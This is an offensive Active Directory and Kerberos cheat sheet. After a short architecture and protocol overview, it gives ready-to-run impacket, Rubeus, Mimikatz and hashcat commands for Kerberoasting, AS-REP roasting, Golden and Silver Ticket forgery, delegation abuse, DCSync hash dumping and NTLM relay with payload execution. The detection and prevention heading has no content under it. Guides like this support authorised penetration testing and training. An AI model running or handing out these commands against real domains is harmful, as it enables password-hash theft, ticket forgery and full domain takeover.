Active Directory & Kerberos

AD Architecture

ConceptDescription
DomainLogical grouping of objects (users, computers, groups) sharing a common database (NTDS.dit) and policies
Domain Controller (DC)Server hosting AD DS, NTDS.dit, and handling authentication (Kerberos KDC + LDAP)
ForestTop-level container — one or more domain trees sharing a common schema, config, and Global Catalog
TreeHierarchy of domains sharing a contiguous DNS namespace (e.g., corp.local → sub.corp.local)
TrustRelationship allowing users in one domain to access resources in another (parent-child, forest, external)
Organizational Unit (OU)Container for organizing objects within a domain; GPOs are linked to OUs
Group Policy (GPO)Centralized configuration management applied to OUs, domains, or sites
Global CatalogPartial read-only copy of all objects in the forest — used for cross-domain searches
NTDS.ditAD database file (C:\Windows\NTDS\ntds.dit) — stores all AD objects including password hashes

LDAP

AD is an LDAP-compatible directory. Default ports: 389 (LDAP), 636 (LDAPS), 3268 (Global Catalog), 3269 (GC over SSL).

Common LDAP Queries

# ldapsearch — enumerate all users
ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w 'Password123' \
  -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName

# Find domain admins
ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w 'Password123' \
  -b "DC=domain,DC=local" "(&(objectClass=group)(cn=Domain Admins))" member

# Find computers
ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w 'Password123' \
  -b "DC=domain,DC=local" "(objectClass=computer)" cn operatingSystem

# Find accounts with SPN set (Kerberoastable)
ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w 'Password123' \
  -b "DC=domain,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# Find accounts with pre-auth disabled (AS-REP Roastable)
ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w 'Password123' \
  -b "DC=domain,DC=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

Kerberos Protocol

Key Concepts

TermDescription
KDCKey Distribution Center — runs on every DC, consists of AS + TGS
ASAuthentication Service — validates identity, issues TGTs
TGSTicket Granting Service — issues service tickets
TGTTicket Granting Ticket — encrypted with krbtgt hash, proves identity to KDC
Service Ticket (ST)Ticket for a specific service — encrypted with the service account's hash
SPNService Principal Name — unique identifier for a service instance (e.g., MSSQLSvc/sql01.domain.local:1433)
PACPrivilege Attribute Certificate — embedded in tickets, contains user's group memberships and privileges
krbtgtService account for KDC — its NTLM hash encrypts all TGTs in the domain

Authentication Flow

# Step 1: AS-REQ / AS-REP (get TGT)
Client → KDC:  AS-REQ { username, timestamp encrypted with user's hash (pre-auth) }
KDC → Client:  AS-REP { TGT (encrypted with krbtgt hash), session key (encrypted with user's hash) }

# Step 2: TGS-REQ / TGS-REP (get Service Ticket)
Client → KDC:  TGS-REQ { TGT, SPN of target service, authenticator (encrypted with session key) }
KDC → Client:  TGS-REP { Service Ticket (encrypted with service account hash), service session key }

# Step 3: AP-REQ (access service)
Client → Service:  AP-REQ { Service Ticket, authenticator (encrypted with service session key) }
Service decrypts ticket with its own hash → validates PAC → grants access

Kerberoasting

Any authenticated domain user can request a service ticket (TGS) for any SPN. The ticket is encrypted with the service account's NTLM hash — crack it offline to recover the password.

Attack Steps

# 1. Find accounts with SPNs (from Linux)
impacket-GetUserSPNs domain.local/user:Password123 -dc-ip DC_IP

# 2. Request tickets and save for cracking
impacket-GetUserSPNs domain.local/user:Password123 -dc-ip DC_IP -request -outputfile kerberoast.txt

# 3. Crack with hashcat (mode 13100 = Kerberoast)
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# 4. Crack with John
john kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt
# From Windows — Rubeus
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# From Windows — PowerView
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File kerberoast.txt

# Targeted Kerberoast (specific user)
.\Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql.txt

DetectionPrevention

AS-REP Roasting

Accounts with DONT_REQUIRE_PREAUTH set return an AS-REP encrypted with the user's hash without needing a valid pre-authentication timestamp. Crack the AS-REP offline.

# From Linux — find and roast
impacket-GetNPUsers domain.local/ -dc-ip DC_IP -usersfile users.txt -format hashcat -outputfile asrep.txt

# With valid creds — auto-find vulnerable accounts
impacket-GetNPUsers domain.local/user:Password123 -dc-ip DC_IP -request -outputfile asrep.txt

# Crack with hashcat (mode 18200)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
# From Windows — Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# PowerView — find vulnerable accounts
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname

Golden Ticket

Forge a TGT using the krbtgt NTLM hash. Grants unrestricted access to any resource in the domain as any user. Persists until the krbtgt password is changed twice.

# Prerequisites: krbtgt NTLM hash, domain SID, domain name
# Typically obtained via DCSync or NTDS.dit extraction

# Impacket — create and use golden ticket
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec domain.local/Administrator@dc01.domain.local -k -no-pass
# Mimikatz — create golden ticket
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGT_NTLM_HASH /ptt

# Verify
klist
dir \\dc01.domain.local\c$

Silver Ticket

Forge a service ticket using the target service account's NTLM hash. Access is limited to that specific service — doesn't touch the KDC (harder to detect).

# Impacket — silver ticket for CIFS (file share)
impacket-ticketer -nthash SERVICE_HASH -domain-sid S-1-5-21-... \
  -domain domain.local -spn cifs/target.domain.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-smbclient domain.local/Administrator@target.domain.local -k -no-pass
# Mimikatz — silver ticket
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... \
  /target:target.domain.local /service:cifs /rc4:SERVICE_NTLM_HASH /ptt

# Inject a ticket into current session

Delegation Attacks

Unconstrained Delegation

Server stores the user's full TGT in memory. If an admin authenticates to the server, their TGT can be extracted and reused.

# Find unconstrained delegation computers (PowerView)
Get-DomainComputer -Unconstrained | Select-Object cn, dnshostname

# Wait for admin to connect, then dump TGTs (Rubeus)
.\Rubeus.exe monitor /interval:5 /filteruser:Administrator

# Force authentication via SpoolService (Printer Bug)
.\SpoolSample.exe dc01.domain.local attacker-server.domain.local

Constrained Delegation

Server can impersonate users only to specific services listed in msDS-AllowedToDelegateTo. Abuse S4U2Self + S4U2Proxy to get tickets as any user.

# Find constrained delegation
impacket-findDelegation domain.local/user:Password123 -dc-ip DC_IP

# Exploit — get service ticket as admin to the allowed service
impacket-getST domain.local/svc_web:Password123 -spn cifs/target.domain.local \
  -impersonate Administrator -dc-ip DC_IP
export KRB5CCNAME=Administrator@cifs_target.domain.local@DOMAIN.LOCAL.ccache
# Rubeus — S4U abuse
.\Rubeus.exe s4u /user:svc_web /rc4:HASH /impersonateuser:Administrator \
  /msdsspn:cifs/target.domain.local /ptt

Resource-Based Constrained Delegation (RBCD)

If you can write to msDS-AllowedToActOnBehalfOfOtherIdentity on a target computer, you can configure it to trust a computer account you control for delegation.

# 1. Create a machine account (or use one you control)
impacket-addcomputer domain.local/user:Password123 -computer-name FAKE01$ -computer-pass Passw0rd

# 2. Set RBCD — configure target to trust FAKE01$
impacket-rbcd domain.local/user:Password123 -dc-ip DC_IP \
  -delegate-from FAKE01$ -delegate-to TARGET$ -action write

# 3. Get service ticket as admin via S4U
impacket-getST domain.local/FAKE01$:Passw0rd -spn cifs/target.domain.local \
  -impersonate Administrator -dc-ip DC_IP
export KRB5CCNAME=Administrator@cifs_target.domain.local@DOMAIN.LOCAL.ccache
impacket-psexec domain.local/Administrator@target.domain.local -k -no-pass

DCSync

Mimics domain controller replication to pull password hashes directly from the DC. Requires DS-Replication-Get-Changes + DS-Replication-Get-Changes-All (Domain Admins, Enterprise Admins, or explicitly granted).

# Impacket — dump all hashes
impacket-secretsdump domain.local/admin:Password123@DC_IP

# Dump specific user
impacket-secretsdump domain.local/admin:Password123@DC_IP -just-dc-user krbtgt

# Dump using Kerberos auth
impacket-secretsdump domain.local/admin@DC_IP -k -no-pass
# Mimikatz
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /all /csv

NTLM Relay

Capture NTLM authentication attempts and relay them to other services to authenticate as the victim.

# 1. Start Responder (capture/relay LLMNR/NBT-NS/mDNS)

# 2. Start ntlmrelayx — relay to target (e.g., SMB, LDAP, MSSQL)

impacket-ntlmrelayx -t ldap://DC_IP --escalate-user youruser  # grant DCSync rights
impacket-ntlmrelayx -t smb://TARGET_IP -e payload.exe         # execute payload

# Relay to multiple targets
impacket-ntlmrelayx -tf targets.txt -smb2support

# Check for SMB signing (required to be disabled for SMB relay)
